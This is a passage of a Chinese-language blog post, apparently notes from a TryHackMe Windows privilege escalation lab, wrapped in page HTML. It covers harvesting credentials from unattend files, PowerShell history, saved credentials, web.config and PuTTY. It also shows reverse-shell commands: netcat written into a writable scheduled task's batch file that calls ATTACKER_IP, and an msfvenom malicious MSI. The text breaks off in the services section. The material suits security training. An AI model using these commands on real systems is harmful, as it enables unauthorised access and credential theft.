@@ -1,0 +1,726 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THMWindowsPrivilegeEscalation | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction在渗透测试期间，您通常会以非特权用户的身份访问某些 Windows 主机。非特权用户的访问权限有限，仅包括其文件和文件夹，并且无法在主机上执行管理任务，从而阻止您完全控制目标。 本房间涵盖了攻击者可用于在 Windows 环境中提升权限的基本技术，允许您使用主机上的任何初始非特权立足点升级到管理员帐户（如果可能）。 Windows Privilege Escalation简">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THMWindowsPrivilegeEscalation">
+<meta property="og:url" content="http://mikannse.space/2024/07/31/THMWindowsPrivilegeEscalation/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="Introduction在渗透测试期间，您通常会以非特权用户的身份访问某些 Windows 主机。非特权用户的访问权限有限，仅包括其文件和文件夹，并且无法在主机上执行管理任务，从而阻止您完全控制目标。 本房间涵盖了攻击者可用于在 Windows 环境中提升权限的基本技术，允许您使用主机上的任何初始非特权立足点升级到管理员帐户（如果可能）。 Windows Privilege Escalation简">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2024-07-31T05:29:55.000Z">
+<meta property="article:modified_time" content="2024-07-31T13:54:12.507Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/07/31/THMWindowsPrivilegeEscalation/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THMWindowsPrivilegeEscalation',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2024-07-31 21:54:12'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THMWindowsPrivilegeEscalation</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-31T05:29:55.000Z" title="发表于 2024-07-31 13:29:55">2024-07-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-31T13:54:12.507Z" title="更新于 2024-07-31 21:54:12">2024-07-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>37分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THMWindowsPrivilegeEscalation"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在渗透测试期间，您通常会以非特权用户的身份访问某些 Windows 主机。非特权用户的访问权限有限，仅包括其文件和文件夹，并且无法在主机上执行管理任务，从而阻止您完全控制目标。</p>
+<p>本房间涵盖了攻击者可用于在 Windows 环境中提升权限的基本技术，允许您使用主机上的任何初始非特权立足点升级到管理员帐户（如果可能）。</p>
+<h1 id="Windows-Privilege-Escalation"><a href="#Windows-Privilege-Escalation" class="headerlink" title="Windows Privilege Escalation"></a>Windows Privilege Escalation</h1><p>简而言之，特权升级包括使用“用户 A”对主机的既定访问权限，并利用该访问权限通过滥用目标系统中的弱点来获取“用户 B”的访问权限。虽然我们通常希望“用户 B”拥有管理权限，但在某些情况下，我们需要升级到其他非特权帐户，然后才能真正获得管理权限。</p>
+<p>获取对不同帐户的访问权限可能很简单，只需在某些粗心的用户未保护的文本文件或电子表格中找到凭据即可，但情况并非总是如此。根据情况，我们可能需要滥用以下一些弱点：</p>
+<ul>
+<li>Windows 服务或计划任务上的错误配置</li>
+<li>分配给我们帐户的过多权限</li>
+<li>易受攻击的软件</li>
+<li>缺少 Windows 安全补丁</li>
+</ul>
+<p>在进入实际技术之前，让我们先看看 Windows 系统上的不同帐户类型。</p>
+<h2 id="Windows-Users"><a href="#Windows-Users" class="headerlink" title="Windows Users"></a>Windows Users</h2><p>Windows 系统主要有两种用户。根据用户的访问级别，我们可以将用户归类为以下组之一：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>管理员</strong></td>
+<td>这些用户拥有最高权限。他们可以更改任何系统配置参数并访问系统中的任何文件。</td>
+</tr>
+<tr>
+<td><strong>标准用户</strong></td>
+<td>这些用户可以访问计算机，但只能执行有限的任务。通常，这些用户不能对系统进行永久或必要的更改，并且只能访问他们的文件。</td>
+</tr>
+</tbody></table>
+<p>任何具有管理权限的用户都属于 <strong>管理员</strong> 组。另一方面，标准用户属于 <strong>用户</strong> 组。</p>
+<p>除此之外，您通常会听到操作系统在权限提升环境中使用的一些特殊内置帐户：</p>
+<table>
+<thead>
+<tr>
+<th><strong>SYSTEM / LocalSystem</strong></th>
+<th>操作系统用于执行内部任务的帐户。它具有对主机上所有文件和资源的完全访问权限，甚至比管理员的权限更高。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Local Service</strong></td>
+<td>用于以“最小”权限运行 Windows 服务的默认帐户。它将使用网络上的匿名连接。</td>
+</tr>
+<tr>
+<td><strong>Network Service</strong></td>
+<td>用于以“最小”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证。</td>
+</tr>
+</tbody></table>
+<p>这些帐户由 Windows 创建和管理，您不能将它们用作其他常规帐户。不过，在某些情况下，您可能会因利用特定服务而获得它们的权限。</p>
+<h1 id="Harvesting-Passwords-from-Usual-Spots"><a href="#Harvesting-Passwords-from-Usual-Spots" class="headerlink" title="Harvesting Passwords from Usual Spots"></a>Harvesting Passwords from Usual Spots</h1><p>获取其他用户访问权限的最简单方法是从受感染的机器收集凭据。此类凭据可能出于多种原因而存在，包括粗心的用户将其留在纯文本文件中；甚至由某些软件（如浏览器或电子邮件客户端）存储。</p>
+<h2 id="无人值守的-Windows-安装"><a href="#无人值守的-Windows-安装" class="headerlink" title="无人值守的 Windows 安装"></a>无人值守的 Windows 安装</h2><p>在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，它允许通过网络将单个操作系统映像部署到多个主机。这些类型的安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户执行初始设置，最终可能会存储在计算机的以下位置：</p>
+<ul>
+<li>C:\Unattend.xml</li>
+<li>C:\Windows\Panther\Unattend.xml</li>
+<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
+<li>C:\Windows\system32\sysprep.inf</li>
+<li>C:\Windows\system32\sysprep\sysprep.xml</li>
+</ul>
+<p>作为这些文件的一部分，您可能会遇到凭据：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;Credentials&gt;</span><br><span class="line">    &lt;Username&gt;Administrator&lt;/Username&gt;</span><br><span class="line">    &lt;Domain&gt;thm.local&lt;/Domain&gt;</span><br><span class="line">    &lt;Password&gt;MyPassword123&lt;/Password&gt;</span><br><span class="line">&lt;/Credentials&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Powershell-History"><a href="#Powershell-History" class="headerlink" title="Powershell History"></a>Powershell History</h2><p>每当用户使用 Powershell 运行命令时，它都会被存储到一个保存过去命令记忆的文件中。这对于快速重复您以前使用过的命令非常有用。如果用户运行的命令直接在 Powershell 命令行中包含密码，则可以稍后使用“cmd.exe”提示符中的以下命令检索密码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>注意：</strong>上述命令只能在 cmd.exe 中运行，因为 Powershell 不会将“%userprofile%”识别为环境变量。要从 Powershell 读取文件，您必须将“%userprofile%”替换为“$Env:userprofile”。</p>
+<h2 id="Saved-Windows-Credentials"><a href="#Saved-Windows-Credentials" class="headerlink" title="Saved Windows Credentials"></a>Saved Windows Credentials</h2><p>Windows 允许我们使用其他用户的凭据。此功能还提供了在系统上保存这些凭据的选项。以下命令将列出已保存的凭据：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></tbody></table></figure>
+
+<p>虽然您看不到实际的密码，但如果您注意到任何值得尝试的凭据，则可以将它们与“runas”命令和“/ savecred”选项一起使用，如下所示。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="IIS-Configuration"><a href="#IIS-Configuration" class="headerlink" title="IIS Configuration"></a>IIS Configuration</h2><p>Internet 信息服务 (IIS) 是 Windows 安装中的默认 Web 服务器。IIS 上的网站配置存储在名为“web.config”的文件中，可以存储数据库密码或配置的身份验证机制。根据安装的 IIS 版本，我们可以在以下位置之一找到 web.config：</p>
+<ul>
+<li>C:\inetpub\wwwroot\web.config</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</li>
+</ul>
+<p>以下是在文件上快速查找数据库连接字符串的方法：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Retrieve-Credentials-from-Software-PuTTY"><a href="#Retrieve-Credentials-from-Software-PuTTY" class="headerlink" title="Retrieve Credentials from Software: PuTTY"></a>Retrieve Credentials from Software: PuTTY</h2><p>PuTTY 是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接的参数，而是可以存储会话，其中可以存储 IP、用户和其他配置以供日后使用。虽然 PuTTY 不允许用户存储他们的 SSH 密码，但它会存储包含明文身份验证凭据的代理配置。</p>
+<p>要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>注意：</strong>Simon Tatham 是 PuTTY 的创建者（他的名字是路径的一部分），而不是我们要检索密码的用户名。运行上述命令后，存储的代理用户名也应该可见。</p>
+<p>就像 putty 存储凭据一样，任何存储密码的软件，包括浏览器、电子邮件客户端、FTP 客户端、SSH 客户端、VNC 软件等，都会有方法来恢复用户保存的任何密码。</p>
+<h1 id="Other-Quick-Wins"><a href="#Other-Quick-Wins" class="headerlink" title="Other Quick Wins"></a>Other Quick Wins</h1><p>权限提升并不总是一项挑战。某些错误配置可让您获得更高权限的用户访问权限，在某些情况下，甚至可获得管理员访问权限。如果您认为这些更属于 CTF 事件的范畴，而不是您在实际渗透测试过程中会遇到的场景，那将有所帮助。但是，如果前面提到的方法都不起作用，您可以随时返回这些方法。</p>
+<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>查看目标系统上的计划任务，您可能会看到计划任务丢失了二进制文件或正在使用您可以修改的二进制文件。</p>
+<p>可以使用 <code>schtasks</code> 命令从命令行列出计划任务，无需任何选项。要检索有关任何服务的详细信息，您可以使用以下命令：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; schtasks /query /tn vulntask /fo list /v</span><br><span class="line">Folder: \</span><br><span class="line">HostName:                             THM-PC1</span><br><span class="line">TaskName:                             \vulntask</span><br><span class="line">Task To Run:                          C:\tasks\schtask.bat</span><br><span class="line">Run As User:                          taskusr1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>您将获得大量有关该任务的信息，但对我们来说重要的是“要运行的任务”参数，该参数指示计划任务执行的内容，以及“以用户身份运行”参数，该参数显示将用于执行任务的用户。</p>
+<p>如果我们当前的用户可以修改或覆盖“要运行的任务”可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而实现简单的特权升级。要检查可执行文件的文件权限，我们使用“icacls”：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; icacls c:\tasks\schtask.bat</span><br><span class="line">c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)</span><br><span class="line">                    BUILTIN\Administrators:(I)(F)</span><br><span class="line">                    BUILTIN\Users:(I)(F)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>从结果中可以看出，<strong>BUILTIN\Users</strong> 组对任务的二进制文件具有完全访问权限 (F)。这意味着我们可以修改 .bat 文件并插入任何我们喜欢的有效载荷。为方便起见，可以在 <code>C:\tools</code> 上找到 <code>nc64.exe</code>。让我们更改 bat 文件以生成反向 shell：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后我们在攻击者的机器上启动一个监听器，这个监听器和我们在反向 shell 上指示的端口相同：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></tbody></table></figure>
+
+<p>下次运行计划任务时，您应该会收到具有 taskusr1 权限的反向 shell。虽然您可能无法在实际情况下启动任务，并且必须等待计划任务触发，但我们已为您的用户提供了手动启动任务的权限，以节省您的时间。我们可以使用以下命令运行任务：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; schtasks /run /tn vulntask</span><br></pre></td></tr></tbody></table></figure>
+
+<p>你将按预期收到具有 taskusr1 权限的反向 shell：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4444</span><br><span class="line">Listening on 0.0.0.0 4444</span><br><span class="line">Connection received on 10.10.175.90 50649</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">wprivesc1\taskusr1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>前往 taskusr1 桌面获取一个标志。不要忘记在本任务结束时输入该标志。</p>
+<h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h2><p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，这些文件可以配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能允许我们生成以管理员权限运行的恶意 MSI 文件。</p>
+<p><strong>注意：</strong>AlwaysInstallElevated 方法不适用于此房间的机器，并且仅作为信息提供。</p>
+<p>此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些值。</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></tbody></table></figure>
+
+<p>为了能够利用此漏洞，必须同时设置这两个参数。否则，将无法利用此漏洞。如果设置了这些参数，您可以使用“msfvenom”生成恶意 .msi 文件，如下所示：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi</span><br></pre></td></tr></tbody></table></figure>
+
+<p>由于这是一个反向 shell，您还应该运行相应配置的 Metasploit Handler 模块。传输您创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Abusing-Service-Misconfigurations"><a href="#Abusing-Service-Misconfigurations" class="headerlink" title="Abusing Service Misconfigurations"></a>Abusing Service Misconfigurations</h1><h2 id="Windows-Services"><a href="#Windows-Services" class="headerlink" title="Windows Services"></a>Windows Services</h2><p>Windows 服务由 <strong>服务控制管理器</strong> (SCM) 管理。SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态以及通常提供配置服务的方法的进程。</p>
+<p>Windows 计算机上的每个服务都将有一个关联的可执行文件，每当启动服务时，SCM 都会运行该可执行文件。需要注意的是，服务可执行文件实现了特殊功能以便能够与 SCM 通信，因此并非任何可执行文件都可以作为服务成功启动。每个服务还指定了服务将在其下运行的用户帐户。</p>
+<p>为了更好地理解服务的结构，让我们使用 <code>sc qc</code> 命令检查 apphostsvc 服务配置：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; sc qc apphostsvc</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: apphostsvc</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Application Host Helper Service</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : localSystem</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在这里我们可以看到，关联的可执行文件是通过 <strong>BINARY_PATH_NAME</strong> 参数指定的，而用于运行服务的帐户则显示在 <strong>SERVICE_START_NAME</strong> 参数上。</p>
+<p>服务具有自由访问控制列表 (DACL)，它指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他权限。DACL 可以从 Process Hacker（位于您计算机的桌面上）中看到：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d8244cfd9d64a7be30f5fb0308fd0806.png" alt="Service DACL"></p>
+<p>所有服务配置都存储在注册表中的“HKLM\SYSTEM\CurrentControlSet\Services\”下：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c05c134e4922ec8ff8d9b56382c58f.png" alt="Service registry entries"></p>
+<p>系统中每个服务都有一个子项。同样，我们可以在 <strong>ImagePath</strong> 值上看到关联的可执行文件，在 <strong>ObjectName</strong> 值上看到用于启动服务的帐户。如果为服务配置了 DACL，它将存储在名为 <strong>Security</strong> 的子项中。正如您现在猜到的那样，默认情况下只有管理员才能修改此类注册表项。</p>
+<h2 id="Insecure-Permissions-on-Service-Executable"><a href="#Insecure-Permissions-on-Service-Executable" class="headerlink" title="Insecure Permissions on Service Executable"></a>Insecure Permissions on Service Executable</h2><p>如果与服务关联的可执行文件具有较弱的权限，允许攻击者修改或替换它，则攻击者可以轻松获得服务帐户的权限。</p>
+<p>为了了解其工作原理，让我们看看在 Splinterware System Scheduler 上发现的一个漏洞。首先，我们将使用“sc”查询服务配置：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; sc qc WindowsScheduler</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: windowsscheduler</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : System Scheduler Service</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : 